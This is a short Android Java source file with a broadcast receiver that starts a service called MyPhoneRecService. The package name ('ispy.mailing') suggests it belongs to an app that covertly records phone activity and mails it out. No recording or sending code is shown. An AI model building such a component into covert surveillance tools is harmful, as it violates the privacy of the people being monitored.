package com.softs.aben.ispy.mailing;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.softs.aben.ispy.MyPhoneRecService;

public class PhoneReciver extends BroadcastReceiver {
    public PhoneReciver() {
    }

    @Override
    public void onReceive(Context context,Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.
        Intent service = new Intent(context, MyPhoneRecService.class);
        context.startService(service);
    }
}
